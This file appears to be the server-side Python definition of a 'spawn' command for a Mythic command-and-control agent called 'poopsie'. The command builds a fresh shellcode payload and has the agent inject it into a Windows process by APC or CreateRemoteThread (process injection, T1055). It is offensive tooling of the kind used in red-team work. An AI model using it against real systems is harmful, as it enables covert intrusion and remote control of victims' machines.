from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio


class SpawnArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="uuid",
                cli_name="Payload",
                display_name="Payload Template (Shellcode)",
                type=ParameterType.Payload,
                supported_agents=["poopsie"],
                supported_agent_build_parameters={"poopsie": {"output_type": "Shellcode"}},
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1, group_name="Default"),
                ],
            ),
            CommandParameter(
                name="technique",
                cli_name="technique",
                display_name="Injection Technique",
                type=ParameterType.ChooseOne,
                default_value="apc",
                choices=["apc", "createremotethread"],
                description="Injection technique to use for spawning the new callback.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2, group_name="Default"),
                ],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")


class SpawnCommand(CommandBase):
    cmd = "spawn"
    needs_admin = False
    help_cmd = "spawn (modal popup)"
    description = "Spawn a new callback by injecting a fresh payload into the configured spawnto process. The payload template must be shellcode."
    version = 2
    author = "@haha150"
    argument_class = SpawnArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        payload_search = await SendMythicRPCPayloadSearch(
            MythicRPCPayloadSearchMessage(
                CallbackID=taskData.Callback.ID,
                PayloadUUID=taskData.args.get_arg("uuid"),
            )
        )

        newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(
            MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID,
                PayloadUUID=taskData.args.get_arg("uuid"),
                NewDescription="{}'s spawned session from task {}".format(
                    taskData.Task.OperatorUsername, str(taskData.Task.DisplayID)
                ),
            )
        )

        if newPayloadResp.Success:
            while True:
                resp = await SendMythicRPCPayloadSearch(
                    MythicRPCPayloadSearchMessage(
                        PayloadUUID=newPayloadResp.NewPayloadUUID,
                    )
                )
                if resp.Success:
                    if resp.Payloads[0].BuildPhase == "success":
                        taskData.args.add_arg("uuid", resp.Payloads[0].AgentFileId)
                        response.DisplayParams = "Spawning new payload from '{}'".format(
                            payload_search.Payloads[0].Description if payload_search.Success and len(payload_search.Payloads) > 0 else "unknown"
                        )
                        break
                    elif resp.Payloads[0].BuildPhase == "error":
                        raise Exception("Failed to build new payload")
                    elif resp.Payloads[0].BuildPhase == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.Payloads[0].BuildPhase)
                else:
                    raise Exception(resp.Error)
        else:
            raise Exception("Failed to start build process")

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
